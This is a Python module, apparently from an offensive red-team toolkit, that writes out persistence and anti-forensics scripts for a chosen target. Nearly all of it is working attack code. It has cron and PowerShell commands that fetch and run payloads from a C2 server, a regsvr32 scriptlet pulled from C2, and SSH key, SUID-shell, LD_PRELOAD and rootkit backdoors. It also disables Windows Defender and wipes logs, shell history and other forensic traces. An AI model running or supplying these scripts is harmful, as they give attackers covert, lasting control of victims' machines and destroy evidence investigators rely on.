"""
Persistence Module
Handles persistence mechanisms and anti-forensics
"""

import logging
import traceback
import sys
from pathlib import Path

# Add configs directory to path for config import
TOOLKIT_DIR = Path(__file__).parent.parent.parent.absolute()
sys.path.insert(0, str(TOOLKIT_DIR / "configs"))

try:
    import config
except ImportError:
    # Fallback config values if import fails
    class config:
        ATTACKER_DOMAIN = "localhost"
        ATTACKER_IP = "127.0.0.1"
        C2_SERVER_URL = "http://localhost:8080"
        SSH_PUBLIC_KEY = ""
        PAYLOAD_OUTPUT_DIR = "loot/payloads/"

from core.utils.output import print_colored

def run_persistence(target: str, tool_executor, script_gen, logger):
    """Execute persistence and anti-forensics phase"""
    logger.info(f"Running persistence module for target: {target}")
    print_colored(f"👻 Running Persistence & Anti-Forensics for: {target}", "GREEN", True)
    print()
    
    try:
        # Ask target OS
        print_colored("Select target OS:", "BLUE")
        print_colored("1) Linux", "GREEN")
        print_colored("2) Windows", "GREEN")
        print_colored("OS [1-2]: ", "CYAN", end="")
        
        os_choice = input().strip()
        
        if os_choice == "1":
            # Linux persistence with config values
            linux_content = f'''#!/bin/bash
# Linux Persistence Mechanisms for {target}

# Add cron job for persistence
echo "*/5 * * * * curl -s {config.C2_SERVER_URL}/update.sh | bash > /dev/null 2>&1" | crontab -
echo "/tmp/.update &" >> /etc/rc.local

# Create systemd service
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.update
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable update.service
systemctl start update.service

# SSH key persistence
mkdir -p ~/.ssh
echo "{config.SSH_PUBLIC_KEY}" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Bash profile persistence
echo "/tmp/.update &" >> ~/.bashrc
'''
            script_path = script_gen.safe_write("linux_persistence.sh", linux_content, chmod_exec=True)
            if script_path:
                print_colored(f"📁 Linux persistence script: {script_path}", "GREEN")
        elif os_choice == "2":
            # Windows persistence with config values
            windows_content = f'''@echo off
REM Windows Persistence Mechanisms for {target}

REM Registry Run key persistence
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "C:\\Windows\\System32\\update.exe" /f

REM Scheduled task persistence
schtasks /create /tn "SystemUpdate" /tr "C:\\Windows\\System32\\update.exe" /sc onlogon /ru SYSTEM /f

REM Service persistence
sc create "WindowsUpdate" binpath= "C:\\Windows\\System32\\update.exe" start= auto
sc start "WindowsUpdate"

REM Startup folder persistence
copy "update.exe" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"

REM Download additional payloads
powershell -c "Invoke-WebRequest -Uri '{config.C2_SERVER_URL}/payload.exe' -OutFile 'C:\\Windows\\Temp\\update.exe'"

REM WMI event subscription persistence
wmic /namespace:"\\root\\subscription" PATH __EventFilter CREATE Name="UpdateFilter", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
'''
            script_path = script_gen.safe_write("windows_persistence.bat", windows_content)
            if script_path:
                print_colored(f"📁 Windows persistence script: {script_path}", "GREEN")
        
        # Generate anti-forensics scripts
        generate_antiforensics_scripts(script_gen)
        
    except Exception as e:
        print_colored(f"❌ Persistence phase error: {str(e)}", "RED")
        if logger:
            logger.error(f"Persistence error: {e}\n{traceback.format_exc()}")

def generate_persistence_scripts(target: str, script_gen):
    """Generate persistence mechanism scripts"""
    # Get attacker domain from config
    attacker_domain = getattr(config, 'ATTACKER_DOMAIN', 'localhost')
    c2_server = getattr(config, 'C2_SERVER_URL', 'http://localhost:8080')
    ssh_key = getattr(config, 'SSH_PUBLIC_KEY', '')
    
    # Windows persistence script
    windows_content = f"""# Windows Persistence Mechanisms for {target}

# Registry Run keys
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\\Windows\\System32\\svchost.exe" /f
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "OneDriveSync" /t REG_SZ /d "C:\\Users\\Public\\sync.exe" /f

# Scheduled tasks
schtasks /create /tn "Windows Security Update" /tr "C:\\Windows\\System32\\payload.exe" /sc onlogon /ru SYSTEM /f
schtasks /create /tn "Adobe Updater" /tr "C:\\Program Files\\Common Files\\Adobe\\update.exe" /sc daily /st 09:00 /f

# Services
sc create "WindowsDefenderService" binpath= "C:\\Windows\\System32\\defender.exe" start= auto
sc description "WindowsDefenderService" "Windows Defender Antivirus Service"

# WMI event subscription
wmic /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"

# COM hijacking
reg add "HKCU\\Software\\Classes\\CLSID\\{{CLSID}}\\InprocServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\com.dll" /f

# Startup folder
copy payload.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"

# DLL hijacking
copy legitimate.exe C:\\temp\\
copy malicious.dll C:\\temp\\legitimate_dependency.dll

# Reflective DLL injection
powershell -c "Invoke-ReflectivePEInjection -PEPath payload.dll"

# Registry-less COM
regsvr32 /s /n /u /i:{c2_server}/script.sct scrobj.dll

# Fileless execution
powershell -c "$code = [System.Convert]::FromBase64String('BASE64_PAYLOAD'); [System.Reflection.Assembly]::Load($code)"

# UAC bypass
eventvwr.exe
# Replace with malicious executable in HKCU\\Software\\Classes\\mscfile\\shell\\open\\command

# Disable Windows Defender
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -c "Add-MpPreference -ExclusionPath 'C:\\'"
"""

    # Linux persistence script with config values 
    linux_content = f"""# Linux Persistence Mechanisms for {target}

# Crontab persistence
echo "*/10 * * * * curl -s {c2_server}/update.sh | bash >/dev/null 2>&1" | crontab -
echo "@reboot /tmp/.update >/dev/null 2>&1" | crontab -

# Systemd service
cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=forking
ExecStart=/tmp/.update
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl enable system-update.service
systemctl start system-update.service

# Init.d script
cat > /etc/init.d/system-update << EOF
#!/bin/bash
case "\$1" in
    start)
        /tmp/.update &
        ;;
    stop)
        pkill -f .update
        ;;
    restart)
        \$0 stop
        \$0 start
        ;;
esac
EOF

chmod +x /etc/init.d/system-update
update-rc.d system-update defaults

# SSH key harvesting
mkdir -p ~/.ssh
echo "{ssh_key}" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Bash profile persistence
echo "/tmp/.update &" >> ~/.bashrc
echo "/tmp/.update &" >> ~/.profile

# LD_PRELOAD
echo "/lib/evil.so" >> /etc/ld.so.preload

# SUID backdoor
cp /bin/bash /tmp/.bash
chmod +s /tmp/.bash

# Kernel module persistence (advanced)
insmod /tmp/rootkit.ko
echo "/tmp/rootkit.ko" >> /etc/modules
"""

    windows_path = script_gen.safe_write("windows_persistence_advanced.txt", windows_content)
    linux_path = script_gen.safe_write("linux_persistence_advanced.txt", linux_content)
    print_colored("📁 Advanced persistence scripts generated", "CYAN")
    
    return {"windows": windows_path, "linux": linux_path}

def generate_antiforensics_scripts(script_gen):
    """Generate anti-forensics and cleanup scripts"""
    antiforensics_content = """# Anti-Forensics and Cleanup Script

# Clear Windows event logs
wevtutil cl System
wevtutil cl Security  
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Clear Linux logs
rm -f /var/log/auth.log*
rm -f /var/log/syslog*
rm -f /var/log/messages*
rm -f /var/log/secure*
rm -f ~/.bash_history
history -c

# Clear command history
del %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
rm ~/.bash_history ~/.zsh_history ~/.python_history

# Timestomp files (Windows)
powershell "$(Get-Item file.exe).creationtime=$(Get-Date '01/01/2020 12:00 am')"
powershell "$(Get-Item file.exe).lastaccesstime=$(Get-Date '01/01/2020 12:00 am')"
powershell "$(Get-Item file.exe).lastwritetime=$(Get-Date '01/01/2020 12:00 am')"

# Secure delete
sdelete -p 3 -s -z C:
shred -vfz -n 3 /path/to/file

# Clear registry traces
reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs" /f
reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f

# Clear prefetch
del C:\\Windows\\Prefetch\\*.pf

# Clear temp files
del /q /s %TEMP%\\*
rm -rf /tmp/* /var/tmp/*

# Clear browser artifacts
del "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History"
del "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\places.sqlite"

# Network artifact cleanup
arp -d *
netsh interface ip delete arpcache
ip -s -s neigh flush all
"""
        
    script_path = script_gen.safe_write("antiforensics_cleanup.txt", antiforensics_content)
    if script_path:
        print_colored(f"📁 Anti-forensics script: {script_path}", "CYAN")